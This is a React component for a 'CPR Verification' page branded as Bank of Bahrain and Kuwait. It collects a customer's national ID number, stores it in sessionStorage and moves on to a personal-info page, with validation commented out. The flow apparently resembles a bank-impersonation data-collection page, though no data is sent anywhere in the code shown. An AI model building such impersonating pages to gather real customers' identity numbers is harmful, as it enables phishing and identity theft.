// CPRVerification.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const CPRVerification = () => {
  const [cpr, setCpr] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();

    // Validate CPR input
    // if (!cpr || cpr.length < 9) {
    //   alert("Please enter a valid CPR number (9 digits)");
      // return;
    // }

    setLoading(true);

    // Simulate API call
    setTimeout(() => {
      setLoading(false);
      // Optionally save CPR in sessionStorage or context
      sessionStorage.setItem("cpr_number", cpr);

      // Navigate to Personal Info page
      navigate("/personalinfo");
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] text-white flex flex-col items-center px-6 py-10">
      {/* Logo */}
      <div className="w-full max-w-sm flex justify-end mb-16 mt-5">
        <div className="flex flex-col items-center text-center relative">
          <div className="text-3xl font-bold tracking-wide relative">
            BBK
            <span className="absolute -right-4 -top-1 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl mt-1">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Title & Description */}
      <div className="w-full max-w-sm text-center mb-16">
        <h1 className="text-2xl font-light mb-5">CPR Verification</h1>
        <p className="text-sm opacity-80 leading-relaxed">
          Please provide your Civil Personal Record (CPR) number for identity verification
        </p>
      </div>

      {/* Info Note */}
      <div className="w-full max-w-sm bg-white/10 rounded-lg p-4 mb-8 text-sm opacity-90 leading-relaxed">
        <strong>Note:</strong> Your CPR number is required for enhanced security verification as per Bahrain banking regulations.
      </div>

      {/* Form */}
      <form className="w-full max-w-sm flex flex-col gap-10" onSubmit={handleSubmit}>
        <input
          type="tel"
          name="cpr"
          placeholder="CPR Number *"
          value={cpr}
          maxLength={9}
          required
          onChange={(e) => setCpr(e.target.value)}
          className="w-full bg-transparent border-b border-white/50 py-3 text-white placeholder-white/70 outline-none focus:border-white transition"
        />

        <button
          type="submit"
          disabled={loading || !cpr}
          className={`w-full py-4 text-lg font-medium rounded-full transition transform hover:-translate-y-0.5 ${
            loading || !cpr
              ? "bg-white/20 cursor-not-allowed opacity-60"
              : "bg-white/20 hover:bg-white/30"
          } flex items-center justify-center gap-2`}
        >
          {loading && <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>}
          {loading ? "Submitting..." : "Continue"}
        </button>
      </form>

      {/* Back Button */}
      <div className="w-full max-w-sm text-center mt-10">
        <button
          // onClick={() => navigate(-1)}
          className="text-white/90 hover:text-white hover:underline text-base font-light"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};
export default CPRVerification;
